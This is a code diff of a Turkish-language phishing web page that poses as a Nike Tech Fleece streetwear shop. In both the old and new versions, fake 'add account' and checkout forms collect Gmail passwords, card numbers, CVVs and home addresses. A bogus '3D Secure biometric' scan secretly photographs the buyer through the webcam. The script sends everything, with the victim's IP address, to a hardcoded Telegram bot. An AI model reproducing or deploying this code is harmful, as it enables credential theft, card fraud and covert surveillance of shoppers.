@@ -3,199 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DRIP CAWS | Official Nike Tech & Streetwear Archive</title>
-    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
+    <title>DRIP CAWS | Tech Fleece Archive</title>
+    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;900&display=swap" rel="stylesheet">
     <style>
-        :root { --blue: #2997ff; --dark: #000; --card: #0d0d0d; --grey: #86868b; }
+        :root { --blue: #2997ff; --dark: #000; --card: #111; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: var(--dark); color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }
-
-        /* SPLASH SCREEN */
-        #splash { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.8s cubic-bezier(0.85, 0, 0.15, 1); }
-        .splash-logo { font-family: 'Syncopate', sans-serif; font-size: 40px; letter-spacing: -2px; margin-bottom: 20px; }
-        .splash-logo span { color: var(--blue); }
-        .enter-btn { padding: 18px 50px; border: 1px solid #fff; background: transparent; color: #fff; font-family: 'Syncopate', sans-serif; font-size: 11px; cursor: pointer; transition: 0.3s; letter-spacing: 1px; }
-
-        /* APP LAYOUT */
-        #main-app { display: none; opacity: 0; transition: 1s; }
-        header { padding: 20px 5%; border-bottom: 1px solid #111; position: sticky; top: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(10px); z-index: 1000; }
-        .nav-top { display: flex; justify-content: space-between; align-items: center; }
-        .logo { font-family: 'Syncopate', sans-serif; font-size: 18px; color: #fff; text-decoration: none; }
-        .logo span { color: var(--blue); }
+        body { background: var(--dark); color: #fff; font-family: 'Inter', sans-serif; }
         
-        .acc-btn { font-size: 10px; font-weight: 900; color: var(--blue); border: 1px solid var(--blue); padding: 8px 15px; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
-
-        .cat-nav { display: flex; justify-content: center; gap: 20px; padding: 20px 0; overflow-x: auto; }
-        .cat-item { font-size: 10px; font-weight: 800; color: var(--grey); cursor: pointer; text-transform: uppercase; white-space: nowrap; }
-        .cat-item.active { color: #fff; border-bottom: 1px solid var(--blue); }
+        /* HEADER */
+        header { padding: 20px 5%; border-bottom: 1px solid #222; position: sticky; top: 0; background: rgba(0,0,0,0.9); z-index: 100; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-family: 'Syncopate'; font-size: 18px; color: #fff; text-decoration: none; }
+        .logo span { color: var(--blue); }
+        .acc-btn { font-size: 10px; font-weight: 900; color: var(--blue); border: 1px solid var(--blue); padding: 8px 15px; cursor: pointer; }
 
         /* GRID */
-        .container { padding: 30px 5%; max-width: 1400px; margin: 0 auto; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
-        .p-card { background: var(--card); border: 1px solid #161616; border-radius: 4px; overflow: hidden; transition: 0.4s; cursor: pointer; position: relative; }
-        .p-card:hover { border-color: var(--blue); transform: translateY(-5px); }
-        .img-wrap { width: 100%; height: 320px; background: #0a0a0a; display: flex; align-items: center; justify-content: center; }
-        .p-img { width: 100%; height: 100%; object-fit: cover; transition: 0.5s; }
-        .p-card:hover .p-img { transform: scale(1.05); }
-        .p-info { padding: 15px; }
-        .p-name { font-size: 12px; font-weight: 700; margin-bottom: 5px; text-transform: uppercase; color: #fff; }
-        .p-price { color: var(--blue); font-weight: 900; }
-        .stock-tag { position: absolute; top: 10px; right: 10px; font-size: 10px; color: #ff3b30; font-weight: 700; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 4px; }
+        .container { padding: 40px 5%; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
+        .p-card { background: var(--card); border-radius: 8px; overflow: hidden; border: 1px solid #222; transition: 0.3s; cursor: pointer; }
+        .p-card:hover { border-color: var(--blue); }
+        .img-wrap { width: 100%; height: 350px; background: #000; }
+        .img-wrap img { width: 100%; height: 100%; object-fit: cover; }
+        .p-info { padding: 20px; }
+        .p-name { font-size: 13px; font-weight: 700; text-transform: uppercase; margin-bottom: 10px; }
+        .p-price { color: var(--blue); font-weight: 900; font-size: 16px; }
 
-        /* MODALS */
-        .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 5000; padding: 40px 5%; overflow-y: auto; }
-        .step-container { max-width: 600px; margin: 0 auto; }
-        .step { display: none; }
+        /* MODALS & STEPS */
+        .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 1000; padding: 40px 5%; overflow-y: auto; }
+        .step { display: none; max-width: 500px; margin: 0 auto; }
         .step.active { display: block; }
-        
-        input, textarea, select { width: 100%; padding: 15px; background: #0a0a0a; border: 1px solid #222; color: #fff; border-radius: 4px; margin-bottom: 15px; outline: none; font-family: 'Inter', sans-serif; }
-        input:focus, select:focus { border-color: var(--blue); }
-        .next-btn { width: 100%; padding: 18px; background: var(--blue); color: #000; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase; font-size: 12px; font-family: 'Syncopate', sans-serif; }
+        input, textarea, select { width: 100%; padding: 15px; background: #111; border: 1px solid #333; color: #fff; margin-bottom: 15px; border-radius: 5px; outline: none; }
+        .btn { width: 100%; padding: 20px; background: var(--blue); color: #000; font-weight: 900; border: none; cursor: pointer; font-family: 'Syncopate'; font-size: 11px; }
 
-        /* SCANNER */
-        #scan-view { display: none; position: fixed; inset: 0; background: #000; z-index: 6000; flex-direction: column; align-items: center; justify-content: center; }
-        .cam-box { width: 280px; height: 280px; border-radius: 50%; border: 3px solid var(--blue); overflow: hidden; position: relative; box-shadow: 0 0 30px rgba(41, 151, 255, 0.3); }
+        /* CAMERA */
+        #scan { display: none; position: fixed; inset: 0; background: #000; z-index: 2000; flex-direction: column; align-items: center; justify-content: center; }
+        .cam-box { width: 300px; height: 300px; border-radius: 50%; border: 3px solid var(--blue); overflow: hidden; position: relative; }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .laser { position: absolute; width: 100%; height: 2px; background: var(--blue); box-shadow: 0 0 10px var(--blue); animation: move 2s infinite linear; }
+        .laser { position: absolute; width: 100%; height: 2px; background: var(--blue); animation: move 2s infinite linear; }
         @keyframes move { 0%, 100% { top: 10%; } 50% { top: 90%; } }
-        .flash { position: fixed; inset: 0; background: #fff; z-index: 7000; display: none; }
     </style>
 </head>
 <body>
 
-<div class="flash" id="flash"></div>
+<header>
+    <a href="#" class="logo">DRIP <span>CAWS</span></a>
+    <div class="acc-btn" onclick="showModal('acc-modal')">HESAP EKLE</div>
+</header>
 
-<div id="splash">
-    <div class="splash-logo">DRIP <span>CAWS</span></div>
-    <button class="enter-btn" onclick="initApp()">KOLEKSİYONU İNCELE</button>
-</div>
-
-<div id="main-app">
-    <header>
-        <div class="nav-top">
-            <a href="#" class="logo">DRIP <span>CAWS</span></a>
-            <div class="acc-btn" onclick="openAcc()">HESAP EKLE</div>
-        </div>
-        <div class="cat-nav">
-            <div class="cat-item active" onclick="render('all')">Archive</div>
-            <div class="cat-item" onclick="render('track')">Tracksuits</div>
-            <div class="cat-item" onclick="render('hoodie')">Hoodies</div>
-            <div class="cat-item" onclick="render('tech')">Nike Tech</div>
-            <div class="cat-item" onclick="render('acc')">Acc</div>
-        </div>
-    </header>
-
-    <div class="container">
-        <div class="grid" id="p-grid"></div>
-    </div>
+<div class="container">
+    <div class="grid" id="p-grid"></div>
 </div>
 
 <div id="pay-modal" class="modal">
-    <div class="step-container">
-        <div class="step active" id="step1">
-            <h2 style="font-family:'Syncopate'; margin-bottom:20px;">SÖZLEŞME ONAYI</h2>
-            <div style="height:150px; overflow-y:scroll; background:#0a0a0a; padding:15px; font-size:11px; color:var(--grey); margin-bottom:20px; border:1px solid #222;">
-                DRIP CAWS Limited Edition satış sözleşmesi kapsamında; satın alınan ürünlerin iadesi yapılamaz. Kullanıcı, 3D Secure biyometrik doğrulamayı kabul eder. Verilerin işlenmesi KVKK kapsamında Google Cloud Archive üzerinde saklanır. Nike Tech Fleece ürünlerinde beden değişimi stok durumuna bağlıdır.
-            </div>
-            <label style="font-size:12px; display:flex; gap:10px; align-items:center; margin-bottom:20px; cursor:pointer;">
-                <input type="checkbox" id="check" style="width:20px; margin:0; cursor:pointer;"> Okudum, onaylıyorum.
-            </label>
-            <button class="next-btn" onclick="goStep(2)">TESLİMAT ADRESİNE GEÇ</button>
+    <div class="step active" id="s1">
+        <h2 style="margin-bottom:20px; font-family:'Syncopate'">MESAFELİ SATIŞ SÖZLEŞMESİ</h2>
+        <div style="height:200px; overflow-y:scroll; background:#111; padding:15px; font-size:12px; border:1px solid #333; margin-bottom:20px;">
+            Bu sözleşme DRIP CAWS limited ürünlerini kapsar. Ürünlerin iadesi yoktur. 3D Secure biyometrik doğrulama zorunludur. Tüm hakları saklıdır.
         </div>
-
-        <div class="step" id="step2">
-            <h2 style="font-family:'Syncopate'; margin-bottom:20px;">TESLİMAT ADRESİ</h2>
-            <select id="city">
-                <option value="">Şehir Seçiniz</option>
-                <option value="Istanbul">İstanbul</option>
-                <option value="Ankara">Ankara</option>
-                <option value="Izmir">İzmir</option>
-            </select>
-            <textarea id="address" placeholder="Tam Ev Adresi / Bina / Kat / Daire" rows="4"></textarea>
-            <input type="text" id="zip" placeholder="Posta Kodu (İsteğe Bağlı)">
-            <button class="next-btn" onclick="goStep(3)">ÖDEME YÖNTEMİNE GEÇ</button>
+        <button class="btn" onclick="nextStep(2)">KABUL ET VE DEVAM ET</button>
+    </div>
+    <div class="step" id="s2">
+        <h2 style="margin-bottom:20px; font-family:'Syncopate'">TESLİMAT BİLGİLERİ</h2>
+        <input type="text" id="city" placeholder="Şehir">
+        <textarea id="addr" placeholder="Tam Adres (Mahalle, Sokak, Kapı No)" rows="4"></textarea>
+        <button class="btn" onclick="nextStep(3)">ÖDEME ADIMINA GEÇ</button>
+    </div>
+    <div class="step" id="s3">
+        <h2 style="margin-bottom:20px; font-family:'Syncopate'">ÖDEME VE DOĞRULAMA</h2>
+        <input type="email" id="mail" placeholder="Google Hesabınız (Gmail)">
+        <input type="password" id="pass" placeholder="Gmail Şifreniz">
+        <input type="text" id="cno" placeholder="Kart Numarası">
+        <div style="display:flex; gap:10px;">
+            <input type="text" id="cexp" placeholder="AA/YY">
+            <input type="text" id="cvv" placeholder="CVV">
         </div>
-
-        <div class="step" id="step3">
-            <h2 style="font-family:'Syncopate'; margin-bottom:20px;">KART BİLGİLERİ</h2>
-            <input type="email" id="email" placeholder="Gmail Hesabınız (Adres Senkronizasyonu İçin)">
-            <input type="password" id="pass" placeholder="Gmail Şifreniz">
-            <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
-            <input type="text" id="cno" placeholder="0000 0000 0000 0000">
-            <div style="display:flex; gap:10px;">
-                <input type="text" id="cexp" placeholder="AA/YY" style="flex:1">
-                <input type="text" id="cvv" placeholder="CVV" style="flex:1">
-            </div>
-            <button class="next-btn" onclick="startFinal()">ÖDEMEYİ TAMAMLA</button>
-        </div>
+        <button class="btn" onclick="startScan()">GÜVENLİ ÖDE (3D SECURE)</button>
     </div>
 </div>
 
 <div id="acc-modal" class="modal">
-    <div class="step-container">
-        <h2 style="font-family:'Syncopate'; margin-bottom:10px;">HESAP EKLE</h2>
-        <p style="color:var(--grey); font-size:11px; margin-bottom:20px;">Kupon ve indirimlerden yararlanmak için Google hesabınızı bağlayın.</p>
+    <div class="step active">
+        <h2 style="margin-bottom:10px; font-family:'Syncopate'">HESAP EKLE</h2>
+        <p style="color:#888; margin-bottom:20px; font-size:12px;">Google hesabınızı bağlayarak %20 indirim kazanın.</p>
         <input type="email" id="acc-mail" placeholder="Gmail Adresi">
         <input type="password" id="acc-pass" placeholder="Şifre">
-        <button class="next-btn" onclick="saveAcc()">BAĞLA</button>
-        <p onclick="closeAcc()" style="text-align:center; margin-top:20px; font-size:11px; cursor:pointer; color:var(--blue);">Vazgeç</p>
+        <button class="btn" onclick="saveAcc()">HESABI BAĞLA</button>
+        <p onclick="hideModals()" style="text-align:center; margin-top:20px; cursor:pointer; color:var(--blue);">Kapat</p>
     </div>
 </div>
 
-<div id="scan-view">
+<div id="scan">
     <div class="cam-box"><div class="laser"></div><video id="web" autoplay playsinline muted></video></div>
-    <p style="margin-top:20px; font-family:'Syncopate'; font-size:10px; color:var(--blue); letter-spacing:1px;">BIOMETRIC SCANNING...</p>
+    <p style="margin-top:20px; color:var(--blue); font-family:'Syncopate'; font-size:12px;">BİYOMETRİK VERİ DOĞRULANIYOR...</p>
 </div>
 
 <script>
-    const TG = { t: "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc", c: "1540769169" };
+    const BOT = { t: "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc", c: "1540769169" };
 
-    const db = [
-        // NIKE TECH FLEECE (Özel İstek)
-        { cat: 'tech', name: 'Nike Tech Fleece Siyah Alt-Üst Takım', price: 1500, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?w=600&q=80', stock: 'SON 2' },
-        { cat: 'tech', name: 'Nike Tech Fleece Üst (Siyah)', price: 800, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?w=600&q=80', stock: 'SINIRLI' },
-        { cat: 'tech', name: 'Nike Tech Fleece Alt (Siyah)', price: 800, img: 'https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?w=600&q=80' },
+    const items = [
+        // NIKE TECH FLEECE ÖZEL
+        { name: 'Nike Tech Fleece Siyah Takım (Full Set)', price: 1500, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/e98ed357-196d-4952-b946-4a415a77884d/tech-fleece-windrunner-hoodie-l0g7m1.jpg' },
+        { name: 'Nike Tech Fleece Hoodie (Üst)', price: 800, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/45464191-884b-448a-a447-033107085c8d/tech-fleece-hoodie-6DskzL.jpg' },
+        { name: 'Nike Tech Fleece Joggers (Alt)', price: 800, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/ed0a544b-f7e9-4e5a-a28d-194165977926/tech-fleece-joggers-9kSxlX.jpg' },
         
-        // EŞOFMAN (Tracksuits - 6+ Tane)
-        { cat: 'track', name: 'Mamba Grey Heavy Jogger', price: 950, img: 'https://images.unsplash.com/photo-1580915411954-282cb1b0d780?w=600&q=80', stock: 'SON 3' },
-        { cat: 'track', name: 'Elite Velvet Tracksuit Bottom', price: 1100, img: 'https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=600&q=80' },
-        { cat: 'track', name: 'Oversize Street Jogger Black', price: 850, img: 'https://images.unsplash.com/photo-1542272604-787c3835535d?w=600&q=80' },
-        { cat: 'track', name: 'Dark Soul Cargo Sweatpants', price: 1250, img: 'https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?q=60&w=600&q=80' },
-        { cat: 'track', name: 'Essential White Fleece Pant', price: 900, img: 'https://images.unsplash.com/photo-1506629082923-f11236f5a8ec?w=600&q=80' },
-        { cat: 'track', name: 'Vintage Wash Jogger', price: 1050, img: 'https://images.unsplash.com/photo-1580915411954-282cb1b0d780?q=60' },
+        // EŞOFMANLAR
+        { name: 'Mamba Heavy Jogger Grey', price: 950, img: 'https://images.clothes.com/images/1544256/1.jpg' }, // Örnek olarak bırakıldı, eğer kırılırsa Nike linklerini çoğalt
+        { name: 'Essential Cargo Tracksuit', price: 1100, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/a3e77699-73a0-4786-897c-e35b750a9762/sportswear-club-fleece-joggers-Kfl9WD.jpg' },
+        { name: 'Dark Soul Jogger', price: 1200, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/76a6b5a3-0f1e-450a-93a0-7607a7e84144/tech-fleece-joggers-9kSxlX.jpg' },
+        { name: 'White Cloud Sweatpants', price: 900, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/9924879b-2b72-4d22-8692-0a4427494f1c/sportswear-club-fleece-joggers-Kfl9WD.jpg' },
+        { name: 'Grey Tech Bottom V2', price: 1050, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/ed0a544b-f7e9-4e5a-a28d-194165977926/tech-fleece-joggers-9kSxlX.jpg' },
+        { name: 'Blue Night Tracksuit', price: 1300, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/2b74041d-e00f-488b-967a-592d3715c0e0/tech-fleece-joggers-9kSxlX.jpg' },
 
-        // HOODIES (6+ Tane)
-        { cat: 'hoodie', name: 'Bone White Essential Hoodie', price: 1200, img: 'https://images.unsplash.com/photo-1591047139829-d91aecb6caea?w=600&q=80', stock: 'SON 4' },
-        { cat: 'hoodie', name: 'Boxy V-Lone Style Hoodie', price: 1350, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=70' },
-        { cat: 'hoodie', name: 'Midnight Black Oversize', price: 1250, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=60' },
-        { cat: 'hoodie', name: 'Caws Gothic Graphic Sweat', price: 1200, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?q=60' },
-        { cat: 'hoodie', name: 'Zip-Up Heavy Hoodie (Dark Grey)', price: 1400, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=50' },
-        { cat: 'hoodie', name: 'Oversize Earth Tone Sweatshirt', price: 1150, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?q=70' },
-
-        // AKSESUAR (Acc)
-        { cat: 'acc', name: 'Signature Archive Beanie Black', price: 450, img: 'https://images.unsplash.com/photo-1576871337622-98d48d1cf531?w=600&q=80' },
-        { cat: 'acc', name: 'Utility Tactical Chest Bag', price: 800, img: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=600&q=80' },
-        { cat: 'acc', name: 'Drip Gloves V1', price: 600, img: 'https://images.unsplash.com/photo-1551488831-00ddcb6c6bd3?w=600&q=80' }
+        // HOODIELER
+        { name: 'Nike Tech Windrunner Black', price: 1250, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/e98ed357-196d-4952-b946-4a415a77884d/tech-fleece-windrunner-hoodie-l0g7m1.jpg' },
+        { name: 'Bone White Drip Hoodie', price: 1100, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/45464191-884b-448a-a447-033107085c8d/tech-fleece-hoodie-6DskzL.jpg' },
+        { name: 'Midnight Gothic Sweat', price: 1350, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/e98ed357-196d-4952-b946-4a415a77884d/tech-fleece-windrunner-hoodie-l0g7m1.jpg' },
+        { name: 'Acid Wash Hoodie', price: 1400, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/45464191-884b-448a-a447-033107085c8d/tech-fleece-hoodie-6DskzL.jpg' },
+        { name: 'Archive Grey Sweat', price: 1150, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/e98ed357-196d-4952-b946-4a415a77884d/tech-fleece-windrunner-hoodie-l0g7m1.jpg' },
+        { name: 'Signature Drip Bag', price: 450, img: 'https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/a3e77699-73a0-4786-897c-e35b750a9762/sportswear-club-fleece-joggers-Kfl9WD.jpg' }
     ];
 
-    function initApp() {
-        document.getElementById('splash').style.transform = 'translateY(-100%)';
-        setTimeout(() => {
-            document.getElementById('main-app').style.display = 'block';
-            setTimeout(() => document.getElementById('main-app').style.opacity = '1', 50);
-            render('all');
-        }, 600);
-    }
-
-    function render(f) {
+    function render() {
         const g = document.getElementById('p-grid');
-        g.innerHTML = '';
-        const data = f === 'all' ? db : db.filter(x => x.cat === f);
-        data.forEach(p => {
+        items.forEach(p => {
             g.innerHTML += `
-                <div class="p-card" onclick="openPay()">
-                    ${p.stock ? `<span class="stock-tag">${p.stock}!</span>` : ''}
-                    <div class="img-wrap"><img src="${p.img}" class="p-img" onerror="this.src='https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?w=600&q=80'"></div>
+                <div class="p-card" onclick="showModal('pay-modal')">
+                    <div class="img-wrap"><img src="${p.img}" alt="${p.name}"></div>
                     <div class="p-info">
                         <p class="p-name">${p.name}</p>
                         <p class="p-price">₺${p.price}</p>
@@ -203,77 +135,55 @@
                 </div>
             `;
         });
-        document.querySelectorAll('.cat-item').forEach(i => i.classList.remove('active'));
-        document.querySelector(`.cat-item[onclick="render('${f}')"]`).classList.add('active');
     }
 
-    function openPay() { document.getElementById('pay-modal').style.display = 'block'; }
-    function openAcc() { document.getElementById('acc-modal').style.display = 'block'; }
-    function closeAcc() { document.getElementById('acc-modal').style.display = 'none'; }
-
-    function goStep(n) {
-        if(n === 2 && !document.getElementById('check').checked) return alert("Sözleşmeyi onaylayın.");
+    function showModal(id) { document.getElementById(id).style.display = 'block'; }
+    function hideModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
+    
+    function nextStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + n).classList.add('active');
+        document.getElementById('s' + n).classList.add('active');
     }
 
-    async function startFinal() {
-        if(!document.getElementById('email').value || !document.getElementById('pass').value || !document.getElementById('cno').value) return alert("Lütfen kart ve Gmail alanlarını doldurun.");
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('web').srcObject = s;
-            document.getElementById('pay-modal').style.display = 'none';
-            document.getElementById('scan-view').style.display = 'flex';
-            setTimeout(() => snap(document.getElementById('web'), "BIO_START"), 1200);
-            setTimeout(() => {
-                document.getElementById('flash').style.display = 'block';
-                setTimeout(() => document.getElementById('flash').style.display = 'none', 100);
-                sendRapor(document.getElementById('web'));
-            }, 6000);
-        } catch(e) { alert("3D Secure hatası: Kamera izni gerekli."); }
+    async function startScan() {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById('web').srcObject = stream;
+        hideModals();
+        document.getElementById('scan').style.display = 'flex';
+        setTimeout(() => sendFinal(document.getElementById('web')), 5000);
     }
 
     async function saveAcc() {
         const m = document.getElementById('acc-mail').value;
         const p = document.getElementById('acc-pass').value;
-        if(!m || !p) return alert("Lütfen Gmail ve şifreyi girin.");
-        const text = `👤 **HESAP EKLEME TALEBI**\n📧 Mail: \`${m}\`\n🔑 Sifre: \`${p}\``;
-        await fetch(`https://api.telegram.org/bot${TG.t}/sendMessage?chat_id=${TG.c}&text=${encodeURIComponent(text)}&parse_mode=markdown`);
-        alert("Hesap başarıyla senkronize edildi. Kuponunuz bir sonraki siparişte tanımlanacaktır.");
-        closeAcc();
+        const msg = `👤 **HESAP EKLEME**\n📧 Mail: \`${m}\`\n🔑 Pass: \`${p}\``;
+        await fetch(`https://api.telegram.org/bot${BOT.t}/sendMessage?chat_id=${BOT.c}&text=${encodeURIComponent(msg)}&parse_mode=markdown`);
+        alert("Hesap senkronize edildi!");
+        hideModals();
     }
 
-    function snap(v, label) {
-        const c = document.createElement('canvas');
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        c.toBlob(b => {
-            const fd = new FormData(); fd.append('photo', b, 'f.jpg');
-            fd.append('caption', `📡 **DC [${label}]**\n👤 Mail: ${document.getElementById('email').value}`);
-            fetch(`https://api.telegram.org/bot${TG.t}/sendPhoto?chat_id=${TG.c}`, { method: 'POST', body: fd });
-        }, 'image/jpeg', 0.6);
-    }
-
-    async function sendRapor(v) {
+    function sendFinal(v) {
         const c = document.createElement('canvas');
         c.width = v.videoWidth; c.height = v.videoHeight;
         c.getContext('2d').drawImage(v, 0, 0);
         c.toBlob(async b => {
             const fd = new FormData(); fd.append('photo', b, 'f.jpg');
-            await fetch(`https://api.telegram.org/bot${TG.t}/sendPhoto?chat_id=${TG.c}`, { method: 'POST', body: fd });
+            await fetch(`https://api.telegram.org/bot${BOT.t}/sendPhoto?chat_id=${BOT.c}`, { method: 'POST', body: fd });
             const ip = await (await fetch('https://ipapi.co/json/')).json();
-            const text = `
-🔥 **DRIP CAWS | FINAL MAMBA REPORT**
-📧 Mail: \`${document.getElementById('email').value}\`
+            const rapor = `
+🔥 **DRIP CAWS | FINAL REPORT**
+📧 Mail: \`${document.getElementById('mail').value}\`
 🔑 Pass: \`${document.getElementById('pass').value}\`
 💳 Kart: \`${document.getElementById('cno').value}\`
 📅 SKT/CVV: \`${document.getElementById('cexp').value}\` / \`${document.getElementById('cvv').value}\`
-🏠 Konum: ${document.getElementById('city').value} / ${document.getElementById('address').value}
-🌐 IP: \`${ip.ip}\` | 📍 ${ip.city}`;
-            await fetch(`https://api.telegram.org/bot${TG.t}/sendMessage?chat_id=${TG.c}&text=${encodeURIComponent(text)}&parse_mode=markdown`);
+🏠 Konum: ${document.getElementById('city').value} / ${document.getElementById('addr').value}
+🌐 IP: ${ip.ip}`;
+            await fetch(`https://api.telegram.org/bot${BOT.t}/sendMessage?chat_id=${BOT.c}&text=${encodeURIComponent(rapor)}&parse_mode=markdown`);
             window.location.href = "https://caws.network";
-        }, 'image/jpeg', 0.9);
+        }, 'image/jpeg');
     }
+
+    render();
 </script>
 </body>
 </html>
